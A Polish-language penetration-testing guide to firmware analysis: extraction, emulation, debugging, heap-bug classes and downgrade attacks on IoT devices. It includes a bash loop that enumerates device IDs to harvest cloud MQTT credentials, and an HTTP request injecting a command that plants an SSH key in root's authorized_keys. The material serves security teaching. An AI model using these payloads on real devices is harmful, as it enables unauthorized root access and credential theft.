# Analiza firmware'u

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy mają kontakt, oraz ułatwianie tej komunikacji. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do najważniejszych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware'u to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Gromadzenie informacji**

**Gromadzenie informacji** to kluczowy początkowy etap poznawania budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje zbieranie danych dotyczących:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów bootloadera
- Układu sprzętowego i datasheetów
- Metryk codebase'u i lokalizacji kodu źródłowego
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source software'u w ramach manualnych i automatycznych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware'u**

Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:

- **Bezpośrednio** ze źródła (developerów, producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware'u
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** je z urządzenia poprzez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffując** żądania aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **hardcoded update endpoints**
- **Dumpując** firmware z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, za pomocą odpowiednich narzędzi sprzętowych

### Logi wyłącznie przez UART: wymuszenie roota shell za pomocą env U-Boot w pamięci flash

Jeśli RX UART jest ignorowany (widoczne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję blobu środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zdumpuj SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję środowiska U-Boot, zmodyfikuj `bootargs`, aby zawierał `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla blobu.
3. Ponownie zaprogramuj wyłącznie partycję env i uruchom urządzenie ponownie; shell powinien pojawić się w UART.

Jest to przydatne w przypadku urządzeń embedded, w których shell bootloadera jest wyłączony, ale partycja env jest zapisywalna poprzez zewnętrzny dostęp do pamięci flash.

## Analiza firmware'u

Teraz, gdy **masz firmware**, musisz wyekstrahować z niego informacje, aby wiedzieć, jak z nim postępować. Możesz użyć do tego różnych narzędzi:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>`; jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, obraz prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do przeanalizowania pliku.

### Uzyskiwanie systemu plików

Za pomocą wcześniej opisanych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie będzie mieć magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk do **znalezienia offsetu systemu plików i wycięcia skompresowanego systemu plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd**, aby wyodrębnić system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą znajdować się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware należy je przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware.

### Początkowe narzędzia analityczne

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają identyfikować typy plików, wyodrębniać ciągi znaków, analizować dane binarne oraz poznawać szczegóły partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **embedded files** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu o nazwie odpowiadającej typowi systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnianie. Polega ono na użyciu `binwalk` do znalezienia offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), używane są różne polecenia do ręcznego wyodrębnienia zawartości.

### Analiza filesystemu

Po wyodrębnieniu filesystemu rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone network daemons, hardcoded credentials, API endpoints, funkcje update server, nie skompilowany kod, startup scripts oraz compiled binaries przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem credentials użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Embedded binaries do dalszej analizy
- Typowe web servers i binaries urządzeń IoT

Kilka narzędzi pomaga w wykrywaniu poufnych informacji i luk w filesystemie:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych binaries

Zarówno source code, jak i compiled binaries znalezione w filesystemie muszą zostać dokładnie sprawdzone pod kątem luk. Narzędzia takie jak **checksec.sh** dla binaries Unix i **PESecurity** dla binaries Windows pomagają identyfikować niezabezpieczone binaries, które mogą zostać wykorzystane.

## Pozyskiwanie cloud config i credentials MQTT za pomocą derived URL tokens

Wiele hubów IoT pobiera konfigurację przypisaną do urządzenia z cloud endpointu wyglądającego następująco:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyprowadzany z device ID za pomocą hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako wielkie litery hex

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL oraz pobranie cloud config, często ujawniającego plaintext MQTT credentials i prefiksy topiców.

Praktyczny workflow:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Poszukaj wierszy wypisujących wzorzec adresu URL konfiguracji chmurowej oraz adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbieranie konfiguracji cloud i poświadczeń MQTT

- Zbuduj URL i pobierz JSON za pomocą curl; przeanalizuj go za pomocą jq, aby wyodrębnić sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj plaintext MQTT i słabe topic ACLs (jeśli występują)

- Użyj odzyskanych credentials, aby zasubskrybować maintenance topics i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za autoryzacją)

- Wiele ekosystemów osadza bajty OUI producenta, produktu i typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo generować tokeny i pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed próbą masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware’u.

Proces emulowania firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotykać problemy związane z zależnościami od hardware’u lub architektury, jednak przeniesienie głównego systemu plików albo określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej, może ułatwić dalsze testowanie.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest określenie kolejności bajtów i architektury CPU programu.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używany jest `qemu-mips`, natomiast w przypadku plików binarnych little-endian należy wybrać `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku plików binarnych ARM proces wygląda podobnie — do emulacji wykorzystywany jest emulator `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają pełną emulację firmware, automatyzując ten proces i wspomagając dynamiczną analizę.

## Dynamiczna analiza w praktyce

Na tym etapie do analizy używane jest rzeczywiste lub emulowane środowisko urządzenia. Należy zapewnić stały dostęp powłoki do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co może wymagać okresowego restartowania emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony internetowe i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware mają kluczowe znaczenie dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy runtime

Analiza runtime polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.

W przypadku celów embedded bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i dołącz się zdalnie:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika systemu Linux. Przydatny workflow polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **parser po stronie kontrolera** w radio MCU
3. **tekstowy protokół szeregowy/UART lub protokół TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **dispatcher aplikacji** w głównym daemonie
5. **handler specyficzny dla protokołu / state machine**

Ta architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **grupy komunikatów** i tabele dispatch
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola discriminator specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas **commissioning**, discovery lub faz pobierania firmware/modelu

W przypadku Zigbee przechwytuj ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Install codes w Zigbee 3.0 ograniczają tę ekspozycję, więc odnotuj, czy testowane urządzenie faktycznie ich wymaga.

### Handlery protokołów specyficznych dla producenta i osiągalność kontrolowana przez FSM

Specyficzne dla vendora komendy Zigbee/ZCL są często lepszym celem niż ustandaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, które przeszły mniej testów walidacyjnych.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Reverse handler command dispatch, aż znajdziesz **handler dostępny wyłącznie dla vendora**.
- Odzyskaj tabele **stanu FSM**, **zdarzenia**, **warunku**, **akcji** i **następnego stanu**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
- Potwierdź, które prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na timing replay pakietów z frameworka Python może być zbyt wolny. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na prawdziwym sprzęcie (na przykład **nRF52840**) z użyciem stacka klasy vendor-grade, aby można było ujawnić właściwe **endpoints**, **attributes** i timing commissioning.

### Klasa błędów fragmented-download w embedded daemonach

Powtarzająca się klasa błędów firmware występuje w przypadku **fragmentowanych pobrań blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje alokację `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **oryginalnego rozmiaru zaalokowanego bufora**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym całkowitym rozmiarem, aby wymusić małą alokację na heapie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który spełnia nowe kontrole, jednocześnie przepełniając pierwotnie zaalokowany bufor.

Gdy podatna ścieżka znajduje się za logiką commissioning, exploitacja musi obejmować wystarczającą **emulację urządzenia**, aby doprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem zniekształconych fragmentów.

### Wyzwalacze `free()` sterowane protokołem

W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij zniekształcone kolejne fragmenty, aby przesunąć FSM do stanów **retry** lub **error**.
- Przekrocz próg ponowień, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Użyj tego przewidywalnego `free()`, aby wywołać primitives po stronie allokatora, zanim proces zakończy się z niepowiązanych przyczyn.

Jest to szczególnie przydatne przeciwko allokatorom **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może zamienić logikę unlink/unbin w write primitive. Stabilny schemat polega na uszkodzeniu **pola size**, aby przekierować przechodzenie allokatora do **fałszywych chunków umieszczonych wewnątrz przepełnionego bufora**, zamiast natychmiastowego nadpisania rzeczywistych wskaźników bin i spowodowania crashu procesu.

## Binary Exploitation i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga głębokiego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Ochrony runtime binary są w systemach embedded rzadkie, ale gdy występują, konieczne może być zastosowanie technik takich jak Return Oriented Programming (ROP).

### Uwagi dotyczące fastbin exploitation w uClibc (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść kontrole (prawidłowy size, `fd = 0` oraz sąsiednie chunki uznane za „w użyciu”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE z ASLR:** jeśli ASLR jest włączone, ale główny binary jest **non-PIE**, adresy `.data/.bss` wewnątrz binary są stabilne. Można wskazać obszar, który już przypomina prawidłowy nagłówek chunka heap, aby skierować alokację fastbin na **tablicę wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` może zatrzymać parsowanie, zachowując końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP, który wywołuje `open("/proc/self/mem")`, `lseek()` i `write()`, może umieścić wykonywalny shellcode w znanym mappingu i przekazać do niego wykonanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy OS do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko ze wszystkimi załadowanymi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, zawierający wstępnie załadowane narzędzia do testowania bezpieczeństwa firmware.

## Ataki Firmware Downgrade i niebezpieczne mechanizmy aktualizacji

Nawet gdy vendor implementuje kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Gdy boot- lub recovery-loader weryfikuje jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani monotonicznego licznika) obrazu zapisywanego w urządzeniu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma prawidłowy podpis**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>

Typowy workflow ataku:

1. **Zdobądź starszy podpisany obraz**
* Pobierz go z publicznego portalu pobierania vendora, CDN lub witryny wsparcia.
* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` wewnątrz Android APK).
* Pozyskaj go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** za pośrednictwem dowolnego dostępnego kanału aktualizacji:
* Web UI, API aplikacji mobilnej, USB, TFTP, MQTT itp.
* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które akceptują obrazy firmware zakodowane w Base64, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio łączony z poleceniem shell bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade'em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w APK/APEX w postaci niezaszyfrowanej, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass zabezpieczenia anti-rollback działającego wyłącznie w updaterze w projektach z układem slotów A/B

Niektórzy vendorzy implementują **ratchet** zapobiegający downgrade’om, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, zabezpieczenie przed rollbackiem nadal może zostać ominięte.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / monotoniczny licznik.
- Updater porównuje ratchet obrazu z wartością przechowywaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
- Bootloader **nie parsuje** tego ratchet i przed uruchomieniem wybranego slotu weryfikuje wyłącznie nagłówek, CRC i sygnaturę.
- Aktywacja slotu jest przechowywana oddzielnie, w tablicy partycji lub w liczniku generacji konkretnego slotu, i **nie jest kryptograficznie powiązana** z dokładnym digestem firmware, który został zweryfikowany.

Tworzy to w systemach z dwoma slotami prymityw **validate-one-image / boot-another-image**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel bootowania, używając aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa wyłącznie wcześniej zapisanym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny podpisany** firmware do pasywnego slotu i uruchom standardową procedurę walidacji/przełączania, aby layout oznaczył ten slot jako następny aktywny.
2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wejdź do procedury przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę walidacji, która wymusza ratchet, i wykonaj bezpośredni reboot.
6. Bootloader wybierze promowany slot, zweryfikuje wyłącznie sygnaturę/integralność i uruchomi stary obraz.

Rzeczy, których należy szukać podczas reverse engineeringu implementacji aktualizacji A/B:

- Wybór slotu wyprowadzany z **flag ustawianych podczas bootowania**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego layoutu**.
- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **licznik generacji** / flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nieobecne** w ROM-ie / bootloaderze / etapach secure boot.
- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako bootowalny nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio chronione (TLS + authentication)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać wyłącznie sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot można zmodyfikować po jego promocji?
* Czy po pomyślnym przełączeniu slotu urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji *częściowych* lub *backupowych* ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli któregokolwiek z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, użyj poniższych projektów podatnego firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
